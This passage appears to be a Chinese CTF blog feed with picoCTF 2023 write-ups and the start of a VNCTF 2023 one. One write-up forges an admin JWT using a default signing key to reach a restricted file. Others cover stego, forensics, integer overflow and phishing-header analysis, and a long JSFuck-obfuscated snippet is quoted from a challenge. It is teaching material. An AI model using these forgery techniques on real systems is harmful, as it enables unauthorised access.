id="0x04java-code-analysis"><a class="markdownIt-Anchor" href="#0x04java-code-analysis"></a> 0x04Java Code Analysis!?!</h3><p>把源码下载下来</p><p>提示要找到<code> the JWT Signing Key (&quot;secret key&quot;)</code></p><p>可以在源文件中找到<code>JwtService.java</code>,</p><p>有这样一段源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">JwtService</span><span class="hljs-params">(SecretGenerator secretGenerator)</span>&#123;<br>     <span class="hljs-built_in">this</span>.SECRET_KEY = secretGenerator.getServerSecret();<br> &#125;<br></code></pre></td></tr></table></figure><p><code>secret key</code> 是由<code>secretGenerator</code>产生，看到<code>SecretGenerator.java</code></p><p>密钥放在<code>server_secret.txt</code>里面，当没有这个文件时密钥为<code>1234</code></p><p>先抓一下包，发现JWT,<a href="https://jwt.io/">JWT解码</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Authorization:</span> Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTkxNDQ1MCwiaWF0IjoxNjc5MzA5NjUwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.Y5f4P9ivWsO5AqnXstKtUKyY02s8y8PL9L2msCAkhiI<br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/6.png" class=""><p>根据提示要修改 ‘role’ and ‘userId’，而且要使用密钥<code>1234</code></p><img src="/2023/03/20/picoCTF2023/7.png" class=""><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTkxNDQ1MCwiaWF0IjoxNjc5MzA5NjUwLCJ1c2VySWQiOjIsImVtYWlsIjoiYWRtaW4ifQ.g7dC751n3puM1TmnXbihfTGNED5EHyq6EmiQ9Gl4Dzs</code></p><p>接下来只要访问到flag对应的pdf就应该可以了</p><p>试了几次发现直接访问flag访问不到</p><p>第一个是user就能访问的，可以发现pdf所在路径为<code>/base/books/pdf/3</code></p><p>顺过去flag应该就是访问<code>/base/books/pdf/5</code></p><p>然后就出flag啦</p><img src="/2023/03/20/picoCTF2023/8.png" class=""><h3 id="0x05hidetosee"><a class="markdownIt-Anchor" href="#0x05hidetosee"></a> 0x05HideToSee</h3><img src="/2023/03/20/picoCTF2023/atbash.jpg" class=""><p>提示<code>ectract</code>，想到linux有一个工具<code>strghide</code></p><p><code>steghide extract -sf atbash.jpg</code></p><p>提取到<code>xqkwKBN&#123;z0bib1wv_l3kzgxb3l_k34ijli2&#125;</code></p><p>然后利用<a href="https://www.dcode.fr/atbash-cipher">在线网站</a>或者手动解密</p><p><code>picoCTF&#123;atbash_crack_1f84d779&#125;</code></p><h3 id="0x06readmycert"><a class="markdownIt-Anchor" href="#0x06readmycert"></a> 0x06ReadMyCert</h3><p>下载源件是一个证书</p><p>用openssl</p><p><code>openssl req -noout -text -in readmycert.csr</code></p><p>flag<code>picoCTF&#123;read_mycert_aac33761&#125;</code></p><h3 id="0x07rotation"><a class="markdownIt-Anchor" href="#0x07rotation"></a> 0x07rotation</h3><p>凯撒加密</p><img src="/2023/03/20/picoCTF2023/9.png" class=""><h3 id="0x08reverse"><a class="markdownIt-Anchor" href="#0x08reverse"></a> 0x08Reverse</h3><h3 id="0x09safe-opener-2"><a class="markdownIt-Anchor" href="#0x09safe-opener-2"></a> 0x09Safe Opener 2</h3><p>这两道ida打开直接可以看到flag</p><h3 id="0x0a-hideme"><a class="markdownIt-Anchor" href="#0x0a-hideme"></a> 0x0A hideme</h3><p>binwalk 一下发现有隐藏多个文件</p><p>foremost一下出flag</p><img src="/2023/03/20/picoCTF2023/10.png" class=""><h3 id="0x0bpcappoisoning"><a class="markdownIt-Anchor" href="#0x0bpcappoisoning"></a> 0x0BPcapPoisoning</h3><p>直接搜pico就看到了</p><img src="/2023/03/20/picoCTF2023/11.png" class=""><h3 id="0x0cwho-is-it"><a class="markdownIt-Anchor" href="#0x0cwho-is-it"></a> 0x0Cwho is it</h3><p>下载到一封邮件，直接看邮件头</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Delivered-To: francismanzi@gmail.com<br>Received: <span class="hljs-keyword">by</span> <span class="hljs-number">2002</span>:ab0:<span class="hljs-number">638</span>a:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">with</span> SMTP <span class="hljs-built_in">id</span> y10csp123720uao;<br>        Thu, <span class="hljs-number">7</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">48</span> <span class="hljs-number">-0700</span> (PDT)<br>X-Google-Smtp-Source: AGRyM1u8MgQ0wT0JmPs4nZbKyuwluXeP+mglR/hb66VElgQnwB8M2ofwYUFsHj+eMYBFAVDPITJc<br>X-Received: <span class="hljs-keyword">by</span> <span class="hljs-number">2002</span>:a5d:<span class="hljs-number">6</span>d06:<span class="hljs-number">0</span>:b0:<span class="hljs-number">21</span>b:c434:d99e <span class="hljs-keyword">with</span> SMTP <span class="hljs-built_in">id</span> e6<span class="hljs-number">-20020</span>a5d6d06000000b0021bc434d99emr1524437wrq<span class="hljs-number">.148</span><span class="hljs-number">.1657261188086</span>;<br>        Thu, <span class="hljs-number">07</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">48</span> <span class="hljs-number">-0700</span> (PDT)<br>ARC-Seal: i=<span class="hljs-number">1</span>; a=rsa-sha256; t=<span class="hljs-number">1657261188</span>; cv=none;<br>        d=google.com; s=arc<span class="hljs-number">-20160816</span>;<br>        b=FJZQS4geDnyabQ7SUhA2v3roEqcufLmysXkLoRZd3yNXiNQFBFmwm5v5yANvDyyebA<br>         Jfjqv5X8Gujll585xj/MHlVhlEMg0edNWuwnLXj8SmNuPI1Jon9N+fokhSMxy2WxSACE<br>         <span class="hljs-number">4</span>MruPo5QBlHdrFq8WNBAFgC1VtO0nR+BQYY18wqotLIQPvkXo3yOUUhx0D+ZjUwXvTKV<br>         yUFGdYulF58Lg7wAH/cLWROIHrraWTSsmaGWoYv577nztzueoG5RC5uUAGIAyzsJRqsV<br>         dCsapFxCUlbYbAgIVraylksCA+veFXfil6ocym8KKnls3j40Vojv0VLhHHZxXruG5x/K<br>         M5cQ==<br>ARC-Message-Signature: i=<span class="hljs-number">1</span>; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc<span class="hljs-number">-20160816</span>;<br>        h=mime-<span class="hljs-built_in">version</span>:message-<span class="hljs-built_in">id</span>:<span class="hljs-built_in">date</span>:subject:<span class="hljs-keyword">to</span>:<span class="hljs-keyword">from</span>:dkim-signature;<br>        bh=RneTbuEOZUlwei4ZNPvzjmZpQE92irBmuzImA33zPEc=;<br>        b=RUd+ycq1YWbRNn9wB8UgJ8dZz0tHpvmqcEGQkWqzLy/<span class="hljs-number">6</span>j3aFzaf7dwdoCtXjTTtrrE<br>         z9g498cmB55fs0x1CAjtzI+Nctb1cbPcnfMCrfsF3LwgYhCErFRnbBbOgqw4eeEB+hk0<br>         sKBN0QVpSLs1HlF8ZK3XiMKA2p3vSgHlbhMDPGnFTLHEQjlM63d/L30Rt8mpQsT77ni/<br>         f6X0TqTi4Y8ARIuEELMa6m5E5wQcfUxeUU5WAssz46tQyHKR6xg/g8K2zES+gSNymASk<br>         c5Eaq55k4Zi8dXWaPIwg4IdhVLVxe4llMx8c46GTdh8tvdMtmjME3wIaFR6Q2SLWRSZA<br>         o0hw==<br>ARC-Authentication-Results: i=<span class="hljs-number">1</span>; mx.google.com;<br>       dkim=pass header.i=@onionmail.org header.s=jan2022 header.b=<span class="hljs-number">4</span>sU2nk5Z;<br>       spf=pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) smtp.mailfrom=lpage@onionmail.org;<br>       dmarc=pass (p=NONE sp=NONE dis=NONE) header.<span class="hljs-keyword">from</span>=onionmail.org<br>Return-Path: &lt;lpage@onionmail.org&gt;<br>Received: <span class="hljs-keyword">from</span> mail.onionmail.org (mail.onionmail.org. [<span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span>])<br>        <span class="hljs-keyword">by</span> mx.google.com <span class="hljs-keyword">with</span> ESMTPS <span class="hljs-built_in">id</span> f16<span class="hljs-number">-20020</span>a05600c4e9000b003a1947873d6si1882702wmq<span class="hljs-number">.224</span><span class="hljs-number">.2022</span><span class="hljs-number">.07</span><span class="hljs-number">.07</span><span class="hljs-number">.23</span><span class="hljs-number">.19</span><span class="hljs-number">.47</span><br>        <span class="hljs-keyword">for</span> &lt;francismanzi@gmail.com&gt;<br>        (<span class="hljs-built_in">version</span>=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=<span class="hljs-number">256</span>/<span class="hljs-number">256</span>);<br>        Thu, <span class="hljs-number">07</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> <span class="hljs-number">-0700</span> (PDT)<br>Received-SPF: pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) client-ip=<span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span>;<br>Authentication-Results: mx.google.com;<br>       dkim=pass header.i=@onionmail.org header.s=jan2022 header.b=<span class="hljs-number">4</span>sU2nk5Z;<br>       spf=pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) smtp.mailfrom=lpage@onionmail.org;<br>       dmarc=pass (p=NONE sp=NONE dis=NONE) header.<span class="hljs-keyword">from</span>=onionmail.org<br>DKIM-Signature: v=<span class="hljs-number">1</span>; a=rsa-sha256; c=relaxed/relaxed; d=onionmail.org;<br> q=dns/txt; s=jan2022; bh=RneTbuEOZUlwei4ZNPvzjmZpQE92irBmuzImA33zPEc=;<br> h=<span class="hljs-keyword">from</span>:subject:<span class="hljs-built_in">date</span>:message-<span class="hljs-built_in">id</span>:<span class="hljs-keyword">to</span>:mime-<span class="hljs-built_in">version</span>:content-type;<br> b=<span class="hljs-number">4</span>sU2nk5ZG4F9+lCtCPU4nat6ovALqfOHOUM1/wTskeMdmMAa2yOMXy0GkqolIioL8nG0mRG45<br> OD8b/nHZZEiA0aQppYHECSmXE7IFIFm/MP9wmXIlC/cDF1t9mEwumdDbes7hRhiO6q3A0wYWK+J<br> C+qwHI99irsPhWZOptVVh0HV/HJPAtkzg7OBMX/oPDUSG3xo7dJvT5MCYUm2+<span class="hljs-number">4</span>CBVjvLmEPUVTO<br> uuVEU3HjVjumry5zw1H4s+o9jxCOwpT41uL94NM64Aki4+KIlS75W8Uo1YStqciHSHoEPLMvBhK<br> OMfwhI02u5oLFbk6ZvmhyK5juc54lGbWgk277N0hB0Aw==<br>Received: <span class="hljs-keyword">from</span> localhost<br> <span class="hljs-keyword">by</span> mail.onionmail.org (ZoneMTA) <span class="hljs-keyword">with</span> API <span class="hljs-built_in">id</span> <span class="hljs-number">181</span>dc76dff2000ccee<span class="hljs-number">.001</span><br> <span class="hljs-keyword">for</span> &lt;francismanzi@gmail.com&gt;;<br> Fri, <span class="hljs-number">08</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> +<span class="hljs-number">0000</span><br>X-Zone-Loop: <span class="hljs-number">83440723</span>a48cf749c9e7702024ee772d7cb2fb7cab7a<br>Content-Type: multipart/mixed; boundary=<span class="hljs-string">&quot;--_NmP-426c22a2e0d8fc9a-Part_1&quot;</span><br>From: Larry Page &lt;lpage@onionmail.org&gt;<br>To: francismanzi@gmail.com<br>Subject: One million Prize<br>Date: Fri, <span class="hljs-number">08</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> +<span class="hljs-number">0000</span><br>Message-ID: &lt;<span class="hljs-number">03</span>c11cd1<span class="hljs-number">-8</span>fd9<span class="hljs-number">-584</span>e-c9d7-e53df0faeccc@onionmail.org&gt;<br>MIME-Version: <span class="hljs-number">1.0</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1</span><br>Content-Type: multipart/alternative;<br> boundary=<span class="hljs-string">&quot;--_NmP-426c22a2e0d8fc9a-Part_2&quot;</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2</span><br>Content-Type: <span class="hljs-built_in">text</span>/plain; charset=utf<span class="hljs-number">-8</span><br>Content-Transfer-Encoding: quoted-printable<br><br>Hello dear user, I am Larry Page <span class="hljs-keyword">and</span> I am delighted <span class="hljs-keyword">to</span> announce <span class="hljs-keyword">to</span> you <span class="hljs-keyword">that</span>=<br> you<br>are <span class="hljs-keyword">the</span> <span class="hljs-number">99999999</span>th GMAIL account <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">that</span> we want <span class="hljs-keyword">to</span> reward you. =<br>You&#x27;ve<br>earned $<span class="hljs-number">1</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000.</span> To claim your prize open <span class="hljs-keyword">the</span> attached <span class="hljs-built_in">file</span>.<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2</span><br>Content-Type: <span class="hljs-built_in">text</span>/html; charset=utf<span class="hljs-number">-8</span><br>Content-Transfer-Encoding: quoted-printable<br><br>&lt;p&gt;Hello dear user, I am Larry Page <span class="hljs-keyword">and</span> I am delighted <span class="hljs-keyword">to</span> announce <span class="hljs-keyword">to</span> you =<br><span class="hljs-keyword">that</span> you are <span class="hljs-keyword">the</span> <span class="hljs-number">99999999</span>th GMAIL account <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">that</span> we want <span class="hljs-keyword">to</span> reward =<br>you. You&#x27;ve earned $<span class="hljs-number">1</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000.</span> To claim your prize open <span class="hljs-keyword">the</span> attached <span class="hljs-built_in">file</span>.=<br>&lt;br&gt;&lt;/p&gt;<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2--</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1</span><br>Content-Type: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">name</span>=attachment.txt<br>Content-Transfer-Encoding: base64<br>Content-Disposition: attachment; filename=attachment.txt<br><br>QW1vdW50OiAgJDEsMDAwLDAwMAo=<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1--</span><br></code></pre></td></tr></table></figure><p>分析一下发现邮件是来自ip<code>173.249.33.206</code></p><p>用<code>whois</code>命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whois</span> <span class="hljs-number">173.249.33.206</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/12.png" class=""><h3 id="0x0dfindandopen"><a class="markdownIt-Anchor" href="#0x0dfindandopen"></a> 0x0DFindAndOpen</h3><p>在第48个数据包发现base64编码</p><img src="/2023/03/20/picoCTF2023/13.png" class=""><p>解码<code>This is the secret: picoCTF&#123;R34DING_LOKd_</code></p><p>把这一半当做压缩包密码解码得到flag<code>picoCTF&#123;R34DING_LOKd_fil56_succ3ss_cbf2ebf6&#125;</code></p><h3 id="0x0emsb"><a class="markdownIt-Anchor" href="#0x0emsb"></a> 0x0EMSB</h3><p>发现图片在各个颜色第七管道变化</p><img src="/2023/03/20/picoCTF2023/14.png" class=""><p>直接全部复制下来，然后查找pico</p><img src="/2023/03/20/picoCTF2023/15.png" class=""><h3 id="0x0fchrono"><a class="markdownIt-Anchor" href="#0x0fchrono"></a> 0x0Fchrono</h3><img src="/2023/03/20/picoCTF2023/16.png" class=""><h3 id="0x10money-ware"><a class="markdownIt-Anchor" href="#0x10money-ware"></a> 0x10money-ware</h3><p>提示借助google</p><img src="/2023/03/20/picoCTF2023/17.png" class=""><img src="/2023/03/20/picoCTF2023/18.png" class=""><h3 id="0x11permissions"><a class="markdownIt-Anchor" href="#0x11permissions"></a> 0x11Permissions</h3><p>步骤同chrono</p><h3 id="0x12repetitions"><a class="markdownIt-Anchor" href="#0x12repetitions"></a> 0x12repetitions</h3><p>连续的base64编码</p><p>连续解码后得到<code>picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_4557ec3e&#125;</code></p><h3 id="0x13rules-2023"><a class="markdownIt-Anchor" href="#0x13rules-2023"></a> 0x13Rules 2023</h3><p>直接页面源码搜<code>picoCTF&#123;</code></p><img src="/2023/03/20/picoCTF2023/19.png" class=""><h3 id="0x14two-sum"><a class="markdownIt-Anchor" href="#0x14two-sum"></a> 0x14two-sum</h3><p>下载C语言源码，输入两个数，满足<code>n1 &gt; n1 + n2 OR n2 &gt; n1 + n2</code></p><p>属于整数溢出</p><p>c语言int类型溢出是大于<code>2147483647</code></p><p>所以输入 <code>2147483647</code>和<code>1</code></p><img src="/2023/03/20/picoCTF2023/20.png" class=""><h3 id="0x15ready-gladiator-0"><a class="markdownIt-Anchor" href="#0x15ready-gladiator-0"></a> 0x15Ready Gladiator 0</h3><p>直接输个<code>end</code>就出flag,没看源码，不知道什么原理<code>picoCTF&#123;h3r0_t0_z3r0_4m1r1gh7_a7bf8a57&#125;</code></p><h3 id="0x16useless"><a class="markdownIt-Anchor" href="#0x16useless"></a> 0x16useless</h3><p>居然是把flag藏在帮助文档里面</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">man useless</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/21.png" class=""><h3 id="0x17timer"><a class="markdownIt-Anchor" href="#0x17timer"></a> 0x17timer</h3><p>用jadx打开在<code>com/example.timer/BuildConfig</code>可以找到flag<code>picoCTF&#123;t1m3r_r3v3rs3d_succ355fully_17496&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2023</title>
    <link href="/2023/02/19/VNCTF2023/"/>
    <url>/2023/02/19/VNCTF2023/</url>
    
    <content type="html"><![CDATA[<h3 id="象棋王子"><a class="markdownIt-Anchor" href="#象棋王子"></a> 象棋王子</h3><p>前端JS游戏，按照之前发过的一篇<a href="https://fru1ts.github.io/2023/01/14/%E5%89%8D%E7%AB%AFjs/">前端JS</a>的思路，直接看js文件</p><p>可以发现<code>play.js</code>有结束的判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">play.<span class="hljs-property">showWin</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">my</span>)&#123;<br>play.<span class="hljs-property">isPlay</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (my===<span class="hljs-number">1</span>)&#123;<br>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!